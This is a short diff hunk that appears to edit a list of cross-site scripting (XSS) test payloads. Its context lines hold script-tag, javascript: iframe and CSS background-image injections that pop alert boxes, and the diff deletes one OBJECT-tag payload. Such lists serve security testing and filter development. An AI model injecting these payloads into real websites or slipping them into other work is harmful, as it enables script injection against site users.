@@ -33,7 +33,7 @@ http://66.102.7.147/">XSS
 '"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
 <iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
 &lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;
-&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;
+
 
 
 
